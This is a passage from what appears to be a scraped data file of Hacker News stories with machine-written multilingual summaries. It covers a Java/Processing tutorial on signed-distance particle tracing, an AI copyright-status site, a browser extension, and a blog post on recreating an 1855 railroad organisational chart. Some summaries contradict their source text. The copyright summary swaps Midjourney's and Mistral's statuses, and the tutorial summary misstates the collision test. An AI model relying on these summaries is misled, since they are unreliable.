zero. Our direction of movement wasn’t the shortest path to the surface. We move on, this time a step of size  sdf(P1)  sdf( P_{1}) sdf(P1) and the particle ends up in   P2 P_{2}  P2. We can repeat this until the returned distance is close to zero, or if we never hit the surface, after we reach a cutoff distance. In the figure, the fourth step takes us to  P4 P_{4}  P4, on the surface.\nThe nice thing about this technique is that we don’t have to guess step sizes. There is no risk of taking too many small steps and wasting time, or of taking too large steps and overshoot a collision. The sdf automatically takes care of this by dynamically adapting the step size.\nOur Tracer particle class looks like this:\n\nJava\n\n\t\t\tclass Tracer {\n  Ray ray;\n  float cutoff;\n  float precision;\n  float t;\n  float closestDistance;\n  int steps;\n  int MAXSTEPS=10000;\n  Point p;\n\n  Tracer(Point origin, Vector direction, float cutoff, float precision) {\n    ray=new Ray(origin, direction);\n    this.cutoff=cutoff;\n    this.precision=precision;\n    initialize();\n  }\n\n  void initialize(){\n    closestDistance= Float.POSITIVE_INFINITY;\n    t=0;\n    steps=0;\n    p=ray.get(0);\n  }\n\n  void trace(SDF sdf) {\n    p=null;\n    t=0.0;\n    steps=0;\n    do {\n      traceStep(sdf);\n      steps++;\n    } while (!onSurface() && t<cutoff && steps<MAXSTEPS);\n    if (t>cutoff) t=cutoff;\n    p=ray.get(t);\n  }\n\n  void traceStep(SDF sdf){\n    float d=sdf.signedDistance(ray.get(t));\n    if (d<closestDistance) closestDistance=d;\n    t+=d;\n  }\n\n  boolean onSurface(){\n    return closestDistance<=precision;\n  }\n\n  void reset() {\n    initialize();\n  }\n}\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\nclass Tracer {\n\nRay ray;\n\nfloat cutoff;\n\nfloat precision;\n\nfloat t;\n\nfloat closestDistance;\n\nint steps;\n\nint MAXSTEPS=10000;\n\nPoint p;\n\nTracer(Point origin, Vector direction, float cutoff, float precision) {\n\nray=new Ray(origin, direction);\n\nthis.cutoff=cutoff;\n\nthis.precision=precision;\n\ninitialize();\n\n}\n\nvoid initialize(){\n\nclosestDistance= Float.POSITIVE_INFINITY;\n\nt=0;\n\nsteps=0;\n\np=ray.get(0);\n\n}\n\nvoid trace(SDF sdf) {\n\np=null;\n\nt=0.0;\n\nsteps=0;\n\ndo {\n\ntraceStep(sdf);\n\nsteps++;\n\n} while (!onSurface() && t<cutoff && steps<MAXSTEPS);\n\nif (t>cutoff) t=cutoff;\n\np=ray.get(t);\n\n}\n\nvoid traceStep(SDF sdf){\n\nfloat d=sdf.signedDistance(ray.get(t));\n\nif (d<closestDistance) closestDistance=d;\n\nt+=d;\n\n}\n\nboolean onSurface(){\n\nreturn closestDistance<=precision;\n\n}\n\nvoid reset() {\n\ninitialize();\n\n}\n\n}\n\nEach Tracer starts in a Point origin, along a Vector direction. Since our particles only move in a straight line, we store them as a Ray. We also need to define when we stop tracing the particles. Numerical roundoff makes it unlikely we’ll get exactly 0.0 distance, so instead, we check if the distance becomes smaller than some value precison. If the tracer doesn’t hit, we want to stop after a certain distance, called cutoff. Just to be safe, we limit the maximum number of steps our tracer can take, MAXSTEPS.\nThe current state of a Tracer is held in 4 variables:\n\nt: the current distance traveled along ray\n\nclosestDistance: the closest the particle has come to the surface so far\n\nsteps: the number of steps taken so far\n\np: the current position of the particle along the ray\n\nAt every step, the signed distance function is checked, and the particle is moved that distance forward along the ray. The tracing is stopped once one of three conditions is met:\n\nclosestDistance < precision: the particle has come closer to the surface than our precision threshold: collision.\n\nt>=cutoff: The distance traveled along the ray exceeds the cutoff distance: no collision.\n steps>=MAXSTEPS: The number of steps taken exceeds the maximum number allowed. This should only occur when we’ve made a mistake in the code.\n\nIn any case, at the end of the trace, the particle is either on the surface or beyond our region of interest.\n Putting it all together\n\nTracer_2020 code\nTo reproduce this image, we need to create a sdf, create some particles, and run the traces. The script, including the classes can be found here.\n\nJava\n\n\t\t\tfloat emitterX, emitterY, emitterZ;\nArrayList<Tracer> tracers;\nSDF sdf;\n\nvoid setup() {\n  size(900, 900, P3D);\n  smooth(16);\n  noCursor();\n  createTracers();\n  createSDF();\n  trace();\n}\n\nvoid createTracers() {\n  tracers=new ArrayList<Tracer>();\n  float x, y;\n  emitterZ=500;\n  float cutoff=2*emitterZ;\n  int resX=50;\n  emitterX=600.0;\n  int resY=50;\n  emitterY=600.0;\n\n  for (int i=0; i<resX; i++) {\n    x=map(i, 0, resX-1, -emitterX*0.5, emitterX*0.5);\n    for (int j=0; j<resY; j++) {\n      y=map(j, 0, resY-1, -emitterY*0.5, emitterY*0.5);\n      tracers.add(new Tracer(new Point(x, y, emitterZ),new Vector( 0, 0, -1), cutoff, 0.1));\n    }\n  }\n}\n\nvoid createSDF() {\n  SphereSDF ssdf=new SphereSDF(120);\n  sdf=ssdf;\n}\n\nvoid trace(){\n  for (Tracer tracer : tracers) {\n    tracer.trace(sdf);\n  }\n}\n\nvoid draw() {\n  background(15);\n  //setup perspective\n  translate(width/2, height/2, 0);\n  rotateY(0.8*QUARTER_PI);\n  translate(0, 0, 200);\n\n  //draw sphere\n  fill(0);\n  noStroke();\n  sphere(119);\n\n  //draw limiting plane\n  pushMatrix();\n    translate(0, 0, -emitterZ-1.0);\n    rect(-emitterX*0.5, -emitterY*0.5, emitterX, emitterY);\n  popMatrix();\n\n  //draw tracers\n  strokeWeight(2);\n  stroke(240);\n  for (Tracer tracer : tracers) {\n    point(tracer.p.x, tracer.p.y, tracer.p.z);\n  }\n}\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n\nfloat emitterX, emitterY, emitterZ;\n\nArrayList<Tracer> tracers;\n\nSDF sdf;\n\nvoid setup() {\n\nsize(900, 900, P3D);\n\nsmooth(16);\n\nnoCursor();\n\ncreateTracers();\n\ncreateSDF();\n\ntrace();\n\n}\n\nvoid createTracers() {\n\ntracers=new ArrayList<Tracer>();\n\nfloat x, y;\n\nemitterZ=500;\n\nfloat cutoff=2*emitterZ;\n\nint resX=50;\n\nemitterX=600.0;\n\nint resY=50;\n\nemitterY=600.0;\n\nfor (int i=0; i<resX; i++) {\n\nx=map(i, 0, resX-1, -emitterX*0.5, emitterX*0.5);\n\nfor (int j=0; j<resY; j++) {\n\ny=map(j, 0, resY-1, -emitterY*0.5, emitterY*0.5);\n\ntracers.add(new Tracer(new Point(x, y, emitterZ),new Vector( 0, 0, -1), cutoff, 0.1));\n\n}\n\n}\n\n}\n\nvoid createSDF() {\n\nSphereSDF ssdf=new SphereSDF(120);\n\nsdf=ssdf;\n\n}\n\nvoid trace(){\n\nfor (Tracer tracer : tracers) {\n\ntracer.trace(sdf);\n\n}\n\n}\n\nvoid draw() {\n\nbackground(15);\n\n//setup perspective\n\ntranslate(width/2, height/2, 0);\n\nrotateY(0.8*QUARTER_PI);\n\ntranslate(0, 0, 200);\n\n//draw sphere\n\nfill(0);\n\nnoStroke();\n\nsphere(119);\n\n//draw limiting plane\n\npushMatrix();\n\ntranslate(0, 0, -emitterZ-1.0);\n\nrect(-emitterX*0.5, -emitterY*0.5, emitterX, emitterY);\n\npopMatrix();\n\n//draw tracers\n\nstrokeWeight(2);\n\nstroke(240);\n\nfor (Tracer tracer : tracers) {\n\npoint(tracer.p.x, tracer.p.y, tracer.p.z);\n\n}\n\n}\n\nTo setup the tracers, we create an emitter, a regular 600*600 square grid of 50×50 points. This emitter is positioned somewhere “above” the origin – to the right in the image above. Each point defines a Tracer aimed along the negative Z-axis. The sdf in this example is a single sphere at the origin. To show the tracers missing the sphere, we draw a limiting plane at the cutoff distance.\nBeyond\nThis is just the start. In the next part, we will explore how we can extend the code to manipulate and combine signed distance functions.\nIn 2017, I create a series of images using different combinations of tracers, sdfs and shader effects, that shows just some of the possibilities.",
    "summary": {
      "en": "The text discusses the concept of using signed distance functions (SDFs) in creative coding, specifically in the context of particle collision simulation. Here are the key points simplified:\n\n1. **What is a Signed Distance Function (SDF)?**\n   - SDFs are mathematical functions that define the distance from a point to a surface. They are commonly used in graphics for rendering shapes without needing complex geometry.\n\n2. **Using SDFs in Particle Simulation:**\n   - The author explains how to use SDFs for simulating particles moving through space and colliding with objects like spheres. By calculating the distance from particles to a sphere, we can determine if they are inside, on the surface, or outside the sphere.\n\n3. **Collision Detection:**\n   - Particles are tested against the SDF to see if they hit the sphere. If their distance becomes smaller than the sphere's radius, they collide; otherwise, they continue moving.\n\n4. **Distance Fields:**\n   - The SDF separates space into regions: inside the sphere (negative values), on the surface (zero), and outside (positive values). This makes it easier to check for collisions with various shapes, not just spheres.\n\n5. **Creating Particles:**\n   - The text describes how to create a particle class (Tracer) that moves in straight lines and checks for collisions with the SDF. The tracer records its closest approach to the surface and stops when it either collides or reaches a maximum distance.\n\n6. **Implementing in Code:**\n   - The author provides Java code examples for creating point and vector classes, implementing the SDF, and creating the tracer class. The code demonstrates how to set up a scene with particles and a sphere using Processing, a programming environment for visual arts.\n\n7. **Future Exploration:**\n   - The author mentions plans to extend this work by manipulating and combining SDFs for more complex visuals. They reflect on previous projects that used different combinations of tracers and SDFs to create art.\n\nOverall, the text serves as a tutorial on using SDFs for creative coding in particle simulations, providing foundational knowledge and practical coding examples.",
      "ko": "이 글에서는 창의적인 코딩에서 서명 거리 함수(SDF)를 사용하는 개념, 특히 입자 충돌 시뮬레이션에 대해 설명합니다. 주요 내용을 간단히 정리하면 다음과 같습니다.\n\n서명 거리 함수(SDF)는 점과 표면 사이의 거리를 정의하는 수학적 함수입니다. 복잡한 기하학 없이도 형태를 렌더링하는 데 주로 사용됩니다.\n\n입자 시뮬레이션에서 SDF를 사용하는 방법에 대해 설명합니다. 입자가 공간을 이동하며 구체와 충돌하는 과정을 시뮬레이션할 수 있습니다. 입자와 구체 사이의 거리를 계산하여 입자가 구체 내부에 있는지, 표면에 있는지, 아니면 외부에 있는지를 판단할 수 있습니다.\n\n충돌 감지는 입자가 SDF와 비교되어 구체에 충돌하는지를 확인하는 과정입니다. 입자와 구체 사이의 거리가 구체의 반지름보다 작아지면 충돌이 발생하고, 그렇지 않으면 계속 이동합니다.\n\nSDF는 공간을 여러 영역으로 나눕니다. 구체 내부는 음수 값, 표면은 0, 외부는 양수 값으로 표시됩니다. 이를 통해 구체뿐만 아니라 다양한 형태와의 충돌을 쉽게 확인할 수 있습니다.\n\n입자를 생성하는 방법도 설명합니다. 입자 클래스(Tracer)를 만들어 직선으로 이동하며 SDF와 충돌을 체크합니다. 트레이서는 표면에 가장 가까운 지점을 기록하고 충돌하거나 최대 거리에 도달하면 멈춥니다.\n\n코드 구현에 대한 예시도 제공됩니다. Java 코드로 점과 벡터 클래스를 만들고 SDF를 구현하며 트레이서 클래스를 생성하는 방법을 보여줍니다. 이 코드는 Processing이라는 시각 예술을 위한 프로그래밍 환경을 사용하여 입자와 구체가 있는 장면을 설정하는 방법을 설명합니다.\n\n미래의 탐색에 대한 계획도 언급됩니다. SDF를 조작하고 결합하여 더 복잡한 시각 효과를 만드는 작업을 확장할 계획입니다. 이전 프로젝트에서 다양한 트레이서와 SDF의 조합을 사용하여 예술을 창조했던 경험을 반영합니다.\n\n전반적으로 이 글은 입자 시뮬레이션에서 SDF를 사용하는 방법에 대한 튜토리얼로, 기초 지식과 실용적인 코딩 예제를 제공합니다.",
      "ja": "サイン距離関数（SDF）を使ったクリエイティブコーディング、特に粒子衝突シミュレーションについて説明しています。\n\nサイン距離関数（SDF）とは、点から表面までの距離を定義する数学的な関数です。複雑な幾何学を必要とせずに形状を描画するために、グラフィックスでよく使われています。\n\nSDFを使った粒子シミュレーションでは、粒子が空間を移動し、球体などの物体と衝突する様子をシミュレートします。粒子から球体までの距離を計算することで、粒子が球体の内部にいるのか、表面にいるのか、外部にいるのかを判断できます。\n\n衝突検出では、粒子がSDFに対してテストされ、球体に衝突するかどうかを確認します。粒子と球体の距離が球体の半径より小さくなると衝突が発生し、それ以外の場合は粒子はそのまま移動を続けます。\n\nSDFは空間をいくつかの領域に分けます。球体の内部は負の値、表面はゼロ、外部は正の値です。この仕組みにより、球体だけでなくさまざまな形状との衝突をチェックしやすくなります。\n\n粒子を作成する方法として、直線的に移動し、SDFとの衝突をチェックする粒子クラス（トレーサー）を作成することが説明されています。トレーサーは表面への最も近い接近を記録し、衝突するか最大距離に達するまで動き続けます。\n\nコードの実装については、ポイントとベクトルのクラスを作成し、SDFを実装し、トレーサークラスを作成するためのJavaコードの例が示されています。このコードは、Processingという視覚芸術のためのプログラミング環境を使って、粒子と球体を使ったシーンを設定する方法を示しています。\n\n将来的には、SDFを操作したり組み合わせたりして、より複雑なビジュアルを作成する計画があると著者は述べています。過去のプロジェクトでは、異なるトレーサーとSDFの組み合わせを使ってアートを作成したことを振り返っています。\n\n全体として、このテキストは粒子シミュレーションにおけるSDFの使用方法に関するチュートリアルであり、基礎知識と実践的なコーディング例を提供しています。"
    }
  },
  {
    "id": "2e66ac2f480270cc",
    "title": {
      "en": "Free Output – AI output copyright status checker",
      "ko": "AI 저작권 확인기",
      "ja": "AI著作権チェッカー"
    },
    "type": "story",
    "url": "https://freeoutput.org/",
    "score": 24,
    "by": "knewter",
    "time": 1743273848,
    "content": "AI Output Copyright StatusDiscover which AI providers give you full copyright ownership of the generated content and which ones don't.Show Free Output OnlyOpenAIOpenAI is an AI research and deployment company, creator of ChatGPT and GPT models.Free OutputAnthropicAnthropic is an AI safety company that develops Claude, a conversational AI assistant.Restricted OutputGoogle (Gemini)Google's Gemini (formerly Bard) is a conversational AI service powered by Google's LLM models.Free OutputMidjourneyMidjourney is an AI image generation service accessible through Discord.Restricted OutputDeepSeekDeepSeek is a conversational AI service that provides Open Source models.Free OutputSuno AISuno is an AI music creation program designed to generate realistic songs.Restricted OutputMistral AIMistral is a French AI startup, specializing in open-weight LLMsFree Output",
    "summary": {
      "en": "This text discusses the copyright status of content generated by various AI providers. Here are the key points:\n\n- **OpenAI**: Full copyright ownership of generated content.\n- **Anthropic**: Develops Claude, a conversational AI with restricted output.\n- **Google (Gemini)**: Offers a conversational AI service with free output.\n- **Midjourney**: Generates images via Discord with free output.\n- **DeepSeek**: Provides a conversational AI with open-source models.\n- **Suno AI**: Creates realistic music but has restricted output.\n- **Mistral AI**: A French startup specializing in open-weight language models with restricted output.\n\nThe summary highlights which providers allow full ownership of the content they generate.",
      "ko": "이 텍스트는 다양한 AI 제공업체가 생성한 콘텐츠의 저작권 상태에 대해 다루고 있습니다. 주요 내용은 다음과 같습니다.\n\nOpenAI는 생성된 콘텐츠에 대한 완전한 저작권 소유권을 가지고 있습니다. Anthropic은 제한된 출력을 가진 대화형 AI인 Claude를 개발하고 있습니다. Google의 Gemini는 무료 출력을 제공하는 대화형 AI 서비스를 제공합니다. Midjourney는 Discord를 통해 이미지를 생성하며, 이 또한 무료 출력을 지원합니다. DeepSeek는 오픈 소스 모델을 기반으로 한 대화형 AI를 제공합니다. Suno AI는 현실감 있는 음악을 생성하지만 출력에 제한이 있습니다. Mistral AI는 제한된 출력을 가진 오픈 웨이트 언어 모델에 특화된 프랑스 스타트업입니다.\n\n이 요약은 어떤 제공업체가 생성한 콘텐츠에 대한 완전한 소유권을 허용하는지를 강조합니다.",
      "ja": "このテキストは、さまざまなAIプロバイダーが生成するコンテンツの著作権状況について説明しています。主なポイントは以下の通りです。\n\nOpenAIは、生成されたコンテンツに対して完全な著作権を所有しています。Anthropicは、制限された出力を持つ会話型AI「Claude」を開発しています。GoogleのGeminiは、自由に出力できる会話型AIサービスを提供しています。Midjourneyは、Discordを通じて画像を生成し、自由に出力できます。DeepSeekは、オープンソースのモデルを使用した会話型AIを提供しています。Suno AIはリアルな音楽を作成しますが、出力には制限があります。Mistral AIは、制限された出力を持つオープンウェイトの言語モデルを専門とするフランスのスタートアップです。\n\nこの要約は、どのプロバイダーが生成したコンテンツの完全な所有権を許可しているかを示しています。"
    }
  },
  {
    "id": "b52f13940fb4b58c",
    "title": {
      "en": "Beautiful and Minimalistic Chrome Extension",
      "ko": "아름답고 간결한 크롬 확장기능",
      "ja": "美しきミニマル拡張"
    },
    "type": "story",
    "url": "https://lofitab.com/",
    "score": 15,
    "by": "reynnan",
    "time": 1743275558,
    "content": "Lofi TabTransform your new tab into a productive and calming lofi experience with todos, weather, clock, and beautiful backgrounds.Add to Chrome Add to Edge Try without installing4.8 (20+ reviews)1,000+ usershttps://lofitab.com/try21:09SourceTodosAddAllActiveCompletedNo tasks to display\n\nFeaturesEverything you need to make your new tab productive and beautifulTodos ✍️Keep track of your tasks directly from your new tab. Simple and effective todo management.AddAllActiveCompletedNo tasks to displayClock 🕑Always know the time with a customizable clock in either 12 or 24-hour format.21:09Weather 🌤️Get current weather information right on your new tab. No need to open another app.Lofi Backgrounds 🖼️Choose from over 30 beautiful lofi backgrounds to customize your new tab experience.DynamicStaticLightweight ⚡Optimized for performance. Won't slow down your browser or consume excessive resources.Lightweight ⚡Lofi Tab800kb800kb - 95% smaller!Infinity New Tab5MBMomentum19MBLightweightMediumHeavy\n\nReady to transform your new tab?Add to Chrome Add to Edge",
    "summary": {
      "en": "Lofi Tab is a browser extension that enhances your new tab with a calming lofi theme. It includes features like:\n\n- **To-Do List**: Easily manage your tasks.\n- **Clock**: Displays time in 12 or 24-hour format.\n- **Weather**: Shows current weather updates.\n- **Beautiful Backgrounds**: Choose from over 30 lofi images.\n\nIt's designed to be lightweight, so it won't slow down your browser. The extension has a high rating and is used by over 1,000 people. You can try it without installing.",
      "ko": "Lofi Tab은 새로운 탭을 차분한 로파이 테마로 꾸며주는 브라우저 확장 프로그램입니다. 이 확장 프로그램은 여러 가지 기능을 제공합니다. \n\n먼저, 할 일 목록 기능이 있어 쉽게 작업을 관리할 수 있습니다. 또한, 시계 기능이 포함되어 있어 12시간 또는 24시간 형식으로 시간을 표시합니다. 현재 날씨를 알려주는 날씨 기능도 제공되며, 30개 이상의 아름다운 로파이 이미지를 배경으로 선택할 수 있습니다. \n\n이 확장 프로그램은 가벼운 설계로 되어 있어 브라우저 속도를 느리게 하지 않습니다. 높은 평가를 받고 있으며, 1,000명 이상의 사용자가 있습니다. 설치 없이도 사용해 볼 수 있습니다.",
      "ja": "Lofi Tabは、新しいタブを落ち着いたローファイテーマで彩るブラウザ拡張機能です。この拡張機能には、いくつかの便利な機能が含まれています。まず、タスクを簡単に管理できる「To-Doリスト」があります。また、12時間または24時間形式で時間を表示する「時計」機能も搭載されています。さらに、現在の天気を知らせる「天気」機能や、30種類以上の美しいローファイ画像から選べる「背景」も用意されています。\n\nLofi Tabは軽量設計になっているため、ブラウザの動作を遅くすることはありません。この拡張機能は高評価を得ており、1,000人以上のユーザーに利用されています。インストールせずに試すことも可能です。"
    }
  },
  {
    "id": "ce575d67121969ff",
    "title": {
      "en": "Oracle Cloud Hacked Twice, Denied Thrice",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.reuters.com/technology/fbi-investigating-cyberattack-oracle-bloomberg-news-reports-2025-03-28/",
    "score": 30,
    "by": "dankotanko1599",
    "time": 1743288123,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "a78f47dfa65def19",
    "title": {
      "en": "Making of the New York and Erie Railroad Organizational Diagram",
      "ko": "뉴욕 에리 철도 조직도 제작",
      "ja": "ニューヨーク・エリー鉄道図解"
    },
    "type": "story",
    "url": "https://www.c82.net/blog/?id=98",
    "score": 28,
    "by": "tobr",
    "time": 1743269548,
    "content": "Making of the New York and Erie Railroad organizational diagram\n\nBy Nicholas Rougeux, posted on March 29, 2025 in Art\n\n    Org charts tend to be a rather boring affair—with their lists of names and who reports to whom—but they didn’t start out that way. One of the first in American business, is a stunning portrait of a classic institution—the New York and Erie Railroad. Drawn in 1855 and only rediscovered in recent decades, this diagram captured my attention and I finally took the time to recreate it from scratch as a fun technical exercise. What was unexpected was the depths I ended up going to in order to learn about its fascinating history.\n\nSource material\n\nUnlike my previous projects, the source one was not a lengthy book with hundreds of illustrations or scientific explanations, but a single image available at the Library of Congress.\n\n    Original New York and Erie Railroad diagram (top) and details (bottom). Source: Library of Congress\n\nThis sprawling diagram was designed by Daniel McCallum in 1855 shortly after he became general superintendent of the New York and Erie Railroad and drawn by Civil Engineer George Holt Henshaw. He created it as part of his efforts to improve accountability, operational efficiency, and lines of communications throughout the complex railroad system. Unfortunately, his insistence on enforcing rules he devised to govern all employees ultimately resulted in their resentment toward him, financial difficulties for the railroad as a whole, the first strike of railroad engineers in America, and his resignation. He was later appointed by President Lincoln to take charge of the United States Military Railroads due to his bridge and railroad expertise (Wrege et al., 2005). Despite its origins and the outcomes it precipitated, the diagram remains an impressive feat of design that up until just a few decades ago was relatively unknown.\nIn 1977, railroad and economic historian Alfred Chandler Jr. described the diagram’s existence in his book, The Visible Hand: The Managerial Revolution in American Business by referencing other publications that covered it shortly after it was originally published. Among them was one of his own published in 1956 about his great grandfather, Henry Varnum Poor, editor of the American Railroad Journal during McCallum’s tenure. In this book, Chandler described the diagram:\n\n    The design of the chart was a tree whose roots represented the president and the board of directors; the branches were the five operating divisions and the service departments, engine repairs, car bridge, telegraph, printing, and the treasurer’s and secretary’s offices; while the leaves indicated the various local ticket, freight, and forwarding agents, subordinate superintendents, train crews, foreman, and so forth (Chandler, 1977, as cited in Wrege et al., 2005).\n\nChandler didn’t include an image of the diagram in his book and it remained relatively unknown until 2005 when two researchers, Charles Wrege and Guideon Sorbo Jr. consulted with him for their article, A Bridge Builder Changes a Railroad: The Story of Daniel Craig McCallum in the 24th volume of Canal History and Technology Proceedings. In their article, they detailed Chandler’s descriptions of the diagram and included Poor’s original description from the American Railroad Journal, in which he describes the diagram as “got up in handsome style”—a turn of phrase that I thoroughly enjoyed.\n\n    Image of Poor’s article from the American Railroad Journal, 1865 (Wrege et al., 2005)\n\nWrege and Sorbo also described its resemblance to a tree, hypothesizing that the tree was chosen because of McCallum’s history as a Freemason. However, they were disabused of this when a masonic representative stated, that\n\n    …trees or horticultural metaphors-with the exception of the Acacia as a symbol of hope, rebirth or renewal-play no role in the teachings or rituals of Freemasonry. (Wrege et al., 2005).\n\nAfter much research, they proposed the idea that its organic design was based on the Salix caprea or goat willow—a plant commonly found in the counties around the railroad. They support this notion by comparing drawings of the Salix caprea’s stems and leaves to elements of the diagram and even overlaying a drawing of a Salix caprea directly on top of a mirrored version of the diagram, creating a rather messy, albeit apt comparison, noting:\n\n    The Salix caprea’s fan-shaped appearance, rounded oval leaves, and specific shape of the branches compare favorably to similar elements of the Erie Plan.\n    …one can readily see the close comparison of the distribution of the willow branches and leaves in the picture to the branches and leaves in the Erie Plan. The curvature of the branches and leaves in McCallum’s design follows the typical weeping branches of the Salix caprea. The fact that railroad operations, while mechanized, require great flexibility on the part of the employee, also reinforces his use of the willow in symbolic form. Finally, in comparison to the narrow lanceolate leaves normally associated with willows, the oval leaves of the Salix caprea closely resemble McCallum’s round leaves. (Wrege et al., 2005)\n\n    Salix caprea tree overlaid on a mirror image of the original diagram (left) and depictions of the plan’s various parts (right) (Wrege et al., 2005)\n\nWhile this sounded plausible, it’s my amateur opinion that it was somewhat over-elegant because of its convenience. There are indeed similarities between the diagram and the Salix caprea but not enough evidence to draw a direct connection. I believe the diagram has an organic nature not because of a masonic history or connection to the local flora but because a tree-like branching diagram simply lends itself well to the hierarchical representation of the employees. Regardless, the diagram is a beautiful and functional artwork worthy of many kinds of analyses.\nA great piece of ephemera was included in Wrege and Sorbo’s article in the form of an advertisement for the diagram from July 14, 1856 that appeared in the American Railroad Journal stating that it could be purchased for $1 for thick map paper or $1.75 for it mounted on rollers (about $37–65 after inflation). The authors noted,\n\n    The number of copies of the Erie Plan sold is unknown. Considering the resignation of McCallum in 1857, and the failure of the Erie in 1857, the sales of a diagram of one of the greatest railroads in the world may have been disappointing, which may also be the reason for only one known copy existing today.\n\n    1856 advertisement for the original diagram (Wrege et al., 2005)\n\nViewing such a piece mounted on rollers would have been wonderful to see.\nIn 2013, their article was referenced in a sidebar of an article from McKinsey titled Big data in the age of the telegraph written by then Harvard-Newcomen postdoctoral fellow at the Harvard Business School, now Berkeley Associate Professor Caitlin Rosenthal. In it she discusses McCallum’s diagram and its valuable lessons for leaders navigating large data landscapes. Some time between then and the writing of this post, it came across my radar and languished in the back of my mind ever since.\nWhen looking for a new project, I thought it would be something fun to explore, not knowing how much time I would spend researching its origins. The brief history above is only a portion of what’s available in the various publications I mentioned and all are worth a read. What follows is an account of my efforts to restore, recreate, and expand on the diagram using modern tools.\n\nTypography\n\nThe most appealing part of recreating the diagram was drawing the beautiful curved branches and watching the tree they represent come to life. However, before I could do that, I had to figure out if the building blocks that made it so interesting were even possible—chief among them, typography, which could be broken down into four parts: title, legend, labels, and credits.\n\n    Closeups of key typographical areas\n\nA wide variety of typographical styles were used—ranging from simple and geometric for labels, to ornate in the title. I knew finding the right modern equivalents was going to be a challenge but one I would enjoy. My research started by messaging the talented team at Fonts In Use, a wonderful site created to “document and examine graphic design with the goal of improving typographic literacy and appreciation.” I learned about in 2023 when they posted about the typography used on the newest Metra tickets I acquired. I asked if they could identify any of the typography in the diagram and they confirmed my suspicions that all lettering was engraved by hand and not based on specific fonts.\nI briefly entertained the idea of making my own fonts but I knew what went into designing one and wasn’t ready to embark on such a lengthy journey for a few characters. Instead, I spent days sifting through the hundreds of fonts I collected over the years, libraries like Google Fonts and Adobe Fonts, and other font foundries to find ones that resembled those in the diagram as much as possible.\n\nTitle\n\nThe full text of the diagram is “New York and Erie Railroad diagram representing a plan of organization: exhibiting the division of academic duties and showing the number and class of employés engaged in each department: from the returns of September 1855” and it comprised the most varied typographical collection with 11 fonts—a different one each line and 2 used on the last. Some elegant filigree also decorated the main parts of the title.\n\n    Title of diagram comprising many styles of type\n\nFinding a modern equivalent for the first line, New York and Erie Railroad was a challenge because of its unique ornamental style. The three closest I could find were Hickory, Bruce Ornamented No. 881, and Dusty Circus Main. I chose the latter with some minor vertical stretching because it had roughly the same visual weight of the original. Normally, I loathe stretching a font but made some exceptions with this and a few other areas on the poster to meet space limitations.\n\n    The word Diagram deconstructed into its layers\n\nThe second line, Diagram, was written in old English style and while many fonts in that style are available, the three closest I could find were English Towne, Olde English, and Same Old English JNL. The title had the added feature of thin horizontal lines in the middle for shading and a kind of shadow on the upper right of each character. English Towne was the closest but didn’t have the shading lines. To achieve these effects, I created four separate layers:\n\n    Outlined version of the original font with transparent middle parts\n    Duplicate of the second layer with a custom pattern of horizontal lines applied as a fill\n    Custom-drawn shapes as shadows\n\nRepresenting a Plan was another combination of several layers offset to give the appearance of text elevated off the background. The two closest fonts I found were Noto Serif and Libre Bodoni—both freely available from Google Fonts. The thicker serifs on Noto Serif looked best.\nThe two smallest words—of and and—appeared to be the same style and the closest match I found was Bodoni Moda. I chose the bold italic style even though the original wasn’t italicized to achieve the more decorative “f” like the original.\nOrganization was another word written in an ornamental style and the two closest matches I could find were Rosewood and Alta Mesa Regular. Rosewood was too top heavy with shading and had shadows that were too deep while the latter was the closest match.\nLike with of and and, Bodoni Moda was also used for the text, Exhibiting the division of administrative duties, but with a little vertical stretching. Oranienbaum and Times NR Condensed were considered because of their condensed nature, but Bodoni Moda had more appropriate contrast between its horizontal and vertical strokes.\nTwo fonts immediately came to mind for the text, Showing the number and class of employés: DIN Condensed and Barlow Semi Condensed. I’ve had the DIN family installed for many years and often consider it for text in all caps due and used Barlow in a separate professional project in recent years. DIN Condensed had the closest fit.\nThe typography for Engaged in each department presented an interesting challenge because its text was italicized but leaning to the left, instead of the right, which is the norm. In my research, I learned this type of “reversed italic” text is also called retalic text. It also looked like a form of script, which made finding a match extra challenging. Initially, I couldn’t find any fonts that supported left-leaning text and I didn’t want to manually skew the text because the results would look subpar at best, so I tried to find fonts with italic styles that matched the original diagram. The few I found were Imperial Script, MonteCarlo, Inglesa Variable, and Great Vibes, but none sat well with me. Fortunately, after digging through many fonts on Adobe’s site, I found one a lone retalic style, Beverly Drive. By a stroke of luck, it was also a script that somewhat resembled the original diagram.\nThe penultimate line of text, from the returns of, was a thin slab serif and of the three closest I found—Halant, Glegoo, and Novecento Slab—Glegoo was the closest at the small scale and had consistent width along all strokes.\nFinally, the date at the bottom, September 1855, was written in two styles—old English the month and another serifed one for the year. The three I considered for the month were English Towne (again), LTC Goudy Text Pro, and Amador, with the latter being used because it was a bit more legible, despite the tall x-height of the lowercase letters. Bodoni Moda was used once again for the year.\n\n    Recreated filigree with visible anchors\n\nAs a finishing touch, I reproduced the filigree decorating the first five lines of the title using simple curves with varying stroke widths. Most anchors were placed along horizontal and vertical tangent lines to ensure they were as smooth and clean as possible—a common technique and one I employed two years prior when recreating the title for The Color Printer. At the bottom below the title is a very tiny bit of filigree that was very rough in the original but I did my best to clean up what I thought was the original intent.\n\nThe final title was a fairly close replica and with the spirit of the original.\n\n    Recreated title\n\nLegend\n\nThe legend, or “explanations” as it was labeled, filled in the large area in the lower right of the diagram and contained a brief explanation of McCallum’s rules, an overview of the symbols sprinkled throughout, and a table of “employés” in different classes throughout the railroad.\n\n    Original legend\n\nA wealth of information was packed into that area, dominated by wide italicized handwriting that looked like a combination of print and script. The handwriting was used primarily in the explanation and interspersed with geometric print in the table of employees. The handwriting was a great style that didn’t have a good modern parallel, or so I thought. I searched for typefaces that resembled nineteenth century text and found Madisonian but it felt too formal. I 